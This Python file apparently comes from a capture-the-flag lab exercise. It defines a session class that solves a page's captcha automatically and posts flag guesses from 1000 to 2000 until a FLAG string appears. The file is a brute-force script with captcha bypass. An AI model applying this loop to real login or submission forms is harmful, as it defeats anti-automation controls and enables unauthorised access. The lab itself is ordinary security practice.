import re

import requests

from src.tp3.utils.captcha import Captcha


class Session:
    """
    Class representing a session to solve a captcha and submit a flag.

    Attributes:
        url (str): The URL of the captcha.
        captcha_value (str): The value of the solved captcha.
        flag_value (str): The value of the flag to submit.
        valid_flag (str): The valid flag obtained after processing the response.
    """

    def __init__(self, url):
        """
        Initializes a new session with the given URL.

        Args:
            url (str): The URL of the captcha.
        """
        self.url = url
        self.captcha_value = ""
        self.flag_value = ""
        self.valid_flag = ""
        self.http = requests.Session()
        self.response = None
        self.current_flag = 1000

    def prepare_request(self):
        """
        Prepares the request for sending by capturing and solving the captcha.
        """
        captcha = Captcha(self.url, self.http)
        captcha.capture()
        captcha.solve()

        self.captcha_value = captcha.get_value()
        self.flag_value = str(self.current_flag)

    def submit_request(self):
        """
        Sends the flag and captcha.
        """
        if self.captcha_value == "":
            print(f"Captcha non lu pour flag={self.flag_value}")
            self.response = None
            return

        data = {
            "flag": self.flag_value,
            "captcha": self.captcha_value,
            "code": self.captcha_value,
            "submit": "Envoyer",
        }

        print(f"Try flag={self.flag_value} captcha={self.captcha_value}")

        self.response = self.http.post(self.url, data=data, timeout=10)


    def process_response(self):
        """
        Processes the response.
        """
        if self.response is None:
            return None

        text = self.response.text
        lowered = text.lower()

        flag = re.search(r"FLAG-\d+\{[^}]+\}", text)
        if flag:
            self.valid_flag = flag.group(0)
            print(f"Flag trouve : {self.valid_flag}")
            return True

        if "invalid captcha" in lowered or "incorrect captcha" in lowered:
            print(f"Captcha incorrect pour flag={self.flag_value}")
            return False

        if "incorrect flag" in lowered:
            print(f"Flag incorrect : {self.flag_value}")
            self.current_flag += 1
            return False

        if self.current_flag > 2000:
            print("Aucun flag trouve entre 1000 et 2000")
            return True

        print("Réponse inconnue du serveur :")
        print(text[:500])
        return False

    def get_flag(self):
        """
        Returns the valid flag.

        Returns:
            str: The valid flag.
        """
        return self.valid_flag